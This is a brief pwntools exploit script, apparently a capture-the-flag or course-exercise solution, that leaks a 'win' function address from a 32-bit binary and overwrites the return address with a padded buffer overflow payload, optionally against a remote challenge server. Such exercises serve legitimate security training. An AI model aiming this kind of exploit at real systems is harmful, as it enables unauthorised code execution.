#!/usr/bin/python3

"""
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
"""

binary_path = "./lol"
remote_addr = ('plsdonthaq.me', 1)

#############################
from pwn import *;DEBUG=context.log_level==logging.DEBUG;p=process(binary_path);elf=p.elf;p=remote(*remote_addr) if args["REMOTE"] else p;
#############################

# Exploit

p.recvuntil("Win functions @ ")
func = int(p.recvline(), 16)
log.info(f"Win function at {hex(func)}")
p.sendline(fit({0x4+4: p32(func)}))

p.interactive()